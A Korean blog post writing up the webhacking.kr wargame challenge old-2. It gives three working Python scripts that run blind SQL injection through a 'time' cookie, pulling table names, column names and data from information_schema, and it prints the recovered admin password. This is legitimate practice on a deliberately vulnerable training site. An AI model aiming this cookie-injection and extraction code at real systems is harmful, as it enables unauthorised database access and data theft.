---
layout: post
title: "[Webhacking.kr] old-2"
date: 2025-10-20 01:29:13 +0900
categories: velog
series: "wargame"
---

<p>주말동안 <a href="https://webhacking.kr/challenge/web-02/%EB%A5%BC">https://webhacking.kr/challenge/web-02/를</a> 푸는 것이 과제였다.
사실 지난 주 목요일~금요일부터 찔끔찔끔 해본 것부터 하면 거의 4일? 동안 이 문제만 푼 것 같다... 풀고 풀이 작성은 미뤄뒀다가 이제서야 작성한다. 
주석으로 적혀 있는 시간 값을 좀 주의깊게 살펴봤으면 시간을 절반은 단축할 수 있었을 텐데;; 워게임 경력 부족(?) 이슈...</p>
<p><img alt="" src="/assets/images/hosooinmymind/images/hosooinmymind/post/1b9904dd-10af-4d3e-bb7d-b66d6f79f9e0/image.png"/>
이 코드의 힌트는 총 두 가지다. 첫 번째는 주석 처리되어 있는 시간, 두 번째는 admin.php에 관련된 것.</p>
<p><img alt="" src="/assets/images/hosooinmymind/images/hosooinmymind/post/61bf8475-9820-42e3-808c-73131ef40887/image.png"/>EditThisCookie를 이용해서 쿠키값을 확인해본 결과 time이라는 쿠키의 값이 위처럼 되어 있다.</p>
<p><img alt="" src="/assets/images/hosooinmymind/images/hosooinmymind/post/9e36f87f-867e-4cda-8e10-c1efff4a8252/image.png"/> <a href="https://www.epochconverter.com/%EC%97%90%EC%84%9C">https://www.epochconverter.com/에서</a> 이 timestamp를 human time으로 변경하자 위와 같은 결과를 볼 수 있었다. 이 쿠키가 서버에서 어떻게 사용될까? SELECT ~ FROM ~ WHERE timestamp='~~' 이런 식으로 사용될 확률이 높지 않을까? 그렇다면 쿠키에 SQL Injection을 시도해볼 수 있을 것이다. </p>
<p><img alt="" src="/assets/images/hosooinmymind/images/hosooinmymind/post/abe49c13-74e6-4a03-902b-be2c23397670/image.png"/>쿠키에 false값을 injection</p>
<p><img alt="" src="/assets/images/hosooinmymind/images/hosooinmymind/post/7e73a64a-e6ae-4f7c-ba26-9941945974cf/image.png"/>쿠키에 true값을 injection</p>
<p>두 결과가 다른 것으로 보아 Blind SQL Injection을 시도할 수 있다.
일단 테이블의 개수부터 찾아보자. (사실 코드 작성 부분부터는 ai의 도움을 살짝 받았따...^^)</p>
<pre><code>import requests

url = 'https://webhacking.kr/challenge/web-02/'

cookie = {
    'time': '(SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema = database())'
}

r = requests.get(url, cookies=cookie)
print(r.text)</code></pre><p>위 코드를 실행하자 이런 결과가 나왔다.
** 참고 </p>
<ul>
<li>information_schema.tables는 mysql의 시스템 테이블으로 모든 데이터베이스의 테이블 정보가 들어 있다.</li>
<li>database()함수는 현재 연결된 데이터베이스 이름을 반환한다.</li>
<li>table_schema=database()는 현재 데이터베이스에 속한 테이블들만 필터링한다.
즉 위 sql 쿼리는 현재 데이터베이스에 있는 테이블의 개수를 세는 쿼리이다. 
<img alt="" src="/assets/images/hosooinmymind/images/hosooinmymind/post/f854aaac-d5ea-4f0c-8788-615c33e444c4/image.png"/> 2070-01-01 09:00:02 부분에서 테이블이 2개임을 추측할 수 있다. 서브쿼리가 숫자 2를 반환하면 서버가 이를 타임스탬프로 처리해 위와 같이 표현되었다고 볼 수 있다.</li>
</ul>
<p>이제 테이블의 이름을 찾을 차례이다.</p>
<pre><code>import requests
import re

url = 'https://webhacking.kr/challenge/web-02/'

#--- 첫 번째 테이블명 찾기 ---#
print("\n=== 첫 번째 테이블명 찾기 ===")
table_name = ""

for i in range(1, 15):
    cookie = {
        'time': f'(SELECT ascii(substr(table_name,{i},1)) FROM information_schema.tables WHERE table_schema=database() limit 0,1)'
    }

    r = requests.get(url, cookies=cookie)

    # 시간 패턴 추출: 09:XX:XX 형태
    time_match = re.search(r'09:(\d{2}):(\d{2})', r.text)

    if time_match:
        minutes = int(time_match.group(1))
        seconds = int(time_match.group(2))

        # 분:초를 ASCII 값으로 변환 (01:37 → 1*60+37 = 97)
        ascii_val = minutes * 60 + seconds

        if ascii_val == 0:
            break

        char = chr(ascii_val)
        table_name += char
        print(f'{i}번째 글자: {time_match.group(0)} → ASCII {ascii_val} → "{char}"')

    else:
        print("시간 패턴을 찾을 수 없음")
        break

print(f'\n첫 번째 테이블명: {table_name}')</code></pre><p><img alt="" src="/assets/images/hosooinmymind/images/hosooinmymind/post/ffe26887-8d4d-469d-9f38-2bd07145e509/image.png"/>첫 번째 테이블명은 admin_area_pw임을 알 수 있다.
<img alt="" src="/assets/images/hosooinmymind/images/hosooinmymind/post/e2d61d72-36fc-4b7e-8baf-afbed5cbe86a/image.png"/> limit 1,1로 바꿔서 바로 두 번째 테이블명을 알아냈다. 두 번째 테이블명은 log. 딱 봐도 admin_area_pw에 flag가 있을 것 같이 생겼다. </p>
<p>admin_area_pw의 컬럼 개수, 컬럼명, 데이터 개수, 데이터 내용을 다 추출하는 코드.</p>
<pre><code>import requests
import re

url = 'https://webhacking.kr/challenge/web-02/'

def extract_ascii_from_time(text):
    time_match = re.search(r'09:(\d{2}):(\d{2})', text)
    if time_match:
        minutes = int(time_match.group(1))
        seconds = int(time_match.group(2))
        return minutes * 60 + seconds
    return 0

# admin_area_pw 테이블 분석
table_name = "admin_area_pw"

#--- 컬럼 개수 찾기 ---#
print("=== 컬럼 개수 찾기 ===")
cookie = {'time': f"(SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='{table_name}')"}
r = requests.get(url, cookies=cookie)
column_count = extract_ascii_from_time(r.text)
print(f'{table_name} 테이블의 컬럼 개수: {column_count}개')

#--- 각 컬럼명 찾기 ---#
columns = []
for col_num in range(column_count):
    print(f"\n=== {col_num+1}번째 컬럼명 찾기 ===")
    column_name = ""

    for i in range(1, 20):
        cookie = {'time': f"(SELECT ascii(substr(column_name,{i},1)) FROM information_schema.columns WHERE table_schema=database() AND table_name='{table_name}' LIMIT {col_num},1)"}
        r = requests.get(url, cookies=cookie)

        ascii_val = extract_ascii_from_time(r.text)
        if ascii_val == 0:
            break

        char = chr(ascii_val)
        column_name += char
        print(f'{i}번째 글자: ASCII {ascii_val} → "{char}"')

    columns.append(column_name)
    print(f'{col_num+1}번째 컬럼명: {column_name}')

#--- 테이블 데이터 개수 찾기 ---#
print(f"\n=== {table_name} 테이블의 데이터 개수 ===")
cookie = {'time': f"(SELECT COUNT(*) FROM {table_name})"}
r = requests.get(url, cookies=cookie)
data_count = extract_ascii_from_time(r.text)
print(f'데이터 개수: {data_count}개')

#--- 각 데이터 내용 추출 ---#
for row_num in range(data_count):
    print(f"\n=== {row_num+1}번째 데이터 ===")

    for col_idx, col_name in enumerate(columns):
        print(f"\n--- {col_name} 컬럼 값 ---")
        data_value = ""

        for i in range(1, 50):  # 최대 50글자
            cookie = {'time': f"(SELECT ascii(substr({col_name},{i},1)) FROM {table_name} LIMIT {row_num},1)"}
            r = requests.get(url, cookies=cookie)

            ascii_val = extract_ascii_from_time(r.text)
            if ascii_val == 0:
                break

            char = chr(ascii_val)
            data_value += char
            print(f'{i}번째 글자: ASCII {ascii_val} → "{char}"')

        print(f'{col_name}: {data_value}')</code></pre><p><img alt="" src="/assets/images/hosooinmymind/images/hosooinmymind/post/ff326857-52f0-4546-a5ae-00693510997d/image.png"/>
<img alt="" src="/assets/images/hosooinmymind/images/hosooinmymind/post/5f722a36-b91a-45de-8cef-571f7298d597/image.png"/>
pw는 kudos_to_beistlab이다.</p>
<p><img alt="" src="/assets/images/hosooinmymind/images/hosooinmymind/post/01431dde-1f51-46d9-a10f-a85971e126b5/image.png"/>
이제 admin.php로 이동해서 이 pw를 입력했더니 풀렸다. </p>
<p><img alt="" src="/assets/images/hosooinmymind/images/hosooinmymind/post/8a72e6c9-e1cf-4d61-88c1-7ffd66edc38a/image.png"/></p>
<h3 id="후기">후기</h3>
<p>일단 SQL을 너무 오랜만에 써서 SQL문 작성하기가 은근 빡셌고... 이런 식으로 파이썬 코드를 작성해서 정보를 긁어올 수 있을 거라는 생각을 못했다. 당연히 쿠키값 하나씩 바꿔야 할 줄 알았는데 세상 편해졌다(?) 정규표현식은 더 공부해야할듯.</p>
<h3 id="reference">Reference</h3>
<p><a href="https://www.skshieldus.com/download/files/download.do?o_fname=EQST%20insight_Special%20Report_202208.pdf&amp;r_fname=20220818113242961.pdf">https://www.skshieldus.com/download/files/download.do?o_fname=EQST%20insight_Special%20Report_202208.pdf&amp;r_fname=20220818113242961.pdf</a></p>